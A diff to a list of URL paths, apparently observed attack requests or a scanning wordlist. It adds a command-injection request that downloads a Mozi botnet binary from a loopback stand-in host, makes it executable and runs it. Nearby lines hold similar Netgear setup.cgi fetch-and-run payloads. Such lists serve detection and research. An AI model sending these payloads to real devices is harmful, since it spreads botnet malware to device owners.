@@ -1600,6 +1600,7 @@ infra.zip
 infrastructure.zip
 internal_forms_authentication
 inventory.ini
+ip.ifconfig.dpdns.org:443
 items/.env
 jasperserver-pro/login.html
 jasperserver/login.html
@@ -1777,6 +1778,7 @@ settings.tar.gz
 settings.zip
 setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm_DEFANGED+/tmp/*;wget+http://127.0.0.1:43816/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
 setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm_DEFANGED+/tmp/*;wget+http://127.0.0.1:57919/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
+shell?cd+/tmp;rm_DEFANGED+*;wget+http://127.0.0.1:37019/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
 shell?cd+/tmp;rm_DEFANGED+*;wget+http://127.0.0.1:41886/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
 showLogin.cc
 signin
